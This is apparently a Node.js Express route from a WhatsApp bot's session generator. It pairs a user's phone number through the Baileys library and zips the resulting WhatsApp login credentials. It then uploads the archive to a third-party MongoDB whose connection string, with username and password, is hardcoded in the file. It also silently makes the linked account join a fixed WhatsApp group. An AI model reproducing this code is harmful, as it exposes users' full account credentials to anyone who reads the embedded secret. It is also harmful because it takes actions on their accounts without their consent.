const axios = require('axios');
const { makeid } = require('./id');
const express = require('express');
const fs = require('fs')
const router = express.Router();
const { default: makeWASocket, Browsers, delay, useMultiFileAuthState, BufferJSON, fetchLatestBaileysVersion, PHONENUMBER_MCC, DisconnectReason, makeInMemoryStore, jidNormalizedUser, makeCacheableSignalKeyStore } = require("@whiskeysockets/baileys")
const Pino = require("pino")
const pino = require("pino")
const NodeCache = require("node-cache")
const chalk = require("chalk")
const archiver = require('archiver');
const { MongoClient } = require('mongodb');

router.get('/', async (req, res) => {
    const idd = makeid();
    const id = 'alpha~' + idd;
    let num = req.query.number;

    async function qr() {
        //------------------------------------------------------
        let { version, isLatest } = await fetchLatestBaileysVersion()
        const { state, saveCreds } = await useMultiFileAuthState('./session/' + id)
        const msgRetryCounterCache = new NodeCache() // for retry message, "waiting message"
        const XeonBotInc = makeWASocket({
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false, // popping up QR in terminal log
            browser: Browsers.windows('Firefox'), // for this issues https://github.com/WhiskeySockets/Baileys/issues/328
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, Pino({ level: "fatal" }).child({ level: "fatal" })),
            },
            markOnlineOnConnect: true, // set false for offline
            generateHighQualityLinkPreview: true, // make high preview link
            getMessage: async (key) => {
                let jid = jidNormalizedUser(key.remoteJid)
                let msg = await store.loadMessage(jid, key.id)

                return msg?.message || ""
            },
            msgRetryCounterCache, // Resolve waiting messages
            defaultQueryTimeoutMs: undefined, // for this issues https://github.com/WhiskeySockets/Baileys/issues/276
        })
        if (!XeonBotInc.authState.creds.registered) {
            let phoneNumber = num
            if (!!phoneNumber) {
                phoneNumber = phoneNumber.replace(/[^0-9]/g, '')
            } else {

            }
            setTimeout(async () => {
                let code = await XeonBotInc.requestPairingCode(phoneNumber)
                code = code?.match(/.{1,4}/g)?.join("-") || code
                console.log(chalk.black(chalk.bgGreen(`Your Pairing Code : `)), chalk.black(chalk.white(code)))
                if (!res.headersSent) {
                    await res.send({ code });
                }
            }, 3000)
        }

        XeonBotInc.ev.on("connection.update", async (s) => {
            const { connection, lastDisconnect } = s
            if (connection == "open") {
                await delay(1000 * 10)
                await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: '*thanks for choosing alpha-md*\n*your sesssionid will be sent in 20 seconds please wait..*\n*have a great day ahead*' });
                await delay(1000 * 20)

                // Function to zip folder after creds.json exists
                function zipFolder() {
                    const folderPath = `./session/${id}/`;
                    const randomId = id;
                    const output = fs.createWriteStream(`creds_${randomId}.zip`);
                    const archive = archiver('zip', {
                        zlib: { level: 9 }
                    });
                    output.on('close', async () => {
                        console.log('Zip file created successfully.');
                        const client = new MongoClient('mongodb+srv://uploader2:uploader2@uploader2.uhnmx1u.mongodb.net/?retryWrites=true&w=majority&appName=uploader2');
                        try {
                            await client.connect();
                            const database = client.db('testdb');
                            const collection = database.collection('credentials');
                            const fileContent = fs.readFileSync(`creds_${randomId}.zip`);
                            const result = await collection.insertOne({
                                fileId: randomId,
                                file: fileContent
                            });

                            console.log('File uploaded to MongoDB with ID:', result.insertedId);
                            XeonBotInc.groupAcceptInvite("BGWpp9qySw81CGrqRM3ceg");
                            const xeonses = await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: randomId });
                            await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `*ᴅᴇᴀʀ ᴜsᴇʀ ᴛʜɪs ɪs ʏᴏᴜʀ sᴇssɪᴏɴ ɪᴅ*\n*◕ ⚠️ ᴘʟᴇᴀsᴇ ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜɪs ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴀs ɪᴛ ᴄᴏɴᴛᴀɪɴs ʀᴇǫᴜɪʀᴇᴅ ᴅᴀᴛᴀ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴛᴀɪʟs ᴀɴᴅ ᴀᴄᴄᴇss ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ*` }, { quoted: xeonses });
                        } catch (error) {
                            console.error('Error uploading file to MongoDB:', error);
                        } finally {
                            await client.close();
                        }
                    });
                    archive.on('warning', function (err) {
                        if (err.code === 'ENOENT') {
                            console.warn('File not found:', err);
                        } else {
                            throw err;
                        }
                    });
                    archive.on('error', function (err) {
                        throw err;
                    });
                    archive.pipe(output);
                    archive.directory(folderPath, false);
                    archive.finalize();
                }

                // Check if creds.json exists in the folder, if not, wait
                function checkAndZip() {
                    if (!fs.existsSync(`./session/${id}/creds.json`)) {
                        console.log("creds.json not found. Waiting...");
                        setTimeout(checkAndZip, 1000); // Retry after 1 second
                    } else {
                        zipFolder();
                    }
                }

                checkAndZip();
            }
            if (
                connection === "close" &&
                lastDisconnect &&
                lastDisconnect.error &&
                lastDisconnect.error.output.statusCode != 401
            ) {
                qr()
            }
        })
        XeonBotInc.ev.on('creds.update', saveCreds)
        XeonBotInc.ev.on("messages.upsert", () => {})
    }
    qr()
});

module.exports = router;

process.on('uncaughtException', function (err) {
    let e = String(err)
    if (e.includes("conflict")) return
    if (e.includes("not-authorized")) return
    if (e.includes("Socket connection timeout")) return
    if (e.includes("rate-overlimit")) return
    if (e.includes("Connection Closed")) return
    if (e.includes("Timed Out")) return
    if (e.includes("Value not found")) return
    console.log('Caught exception: ', err)
})
